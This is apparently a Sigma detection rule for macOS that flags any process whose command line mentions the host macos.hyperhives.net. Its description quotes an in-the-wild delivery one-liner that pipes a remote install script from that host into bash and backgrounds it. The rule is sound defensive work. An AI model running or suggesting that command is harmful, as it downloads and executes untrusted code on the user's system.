title: macOS - Process command line referencing macos.hyperhives.net
id: 0f2b7d4e-1a5c-819d-2e3f-4a5b6c7d8e9f
status: experimental
description: |
  Delivery one-liner observed in the wild:
  curl -s https://macos.hyperhives.net/install | nohup bash &
  Fires on any process whose command line includes the delivery host.
license: MIT
author: Independent malware analysis repository
date: 2026-04-06
references:
  - see repository README
logsource:
  category: process_creation
  product: macos
detection:
  selection:
    CommandLine|contains: 'macos.hyperhives.net'
  condition: selection
falsepositives:
  - Security research sandboxes
level: high
tags:
  - attack.execution
  - attack.t1059.004
  - attack.t1204.002

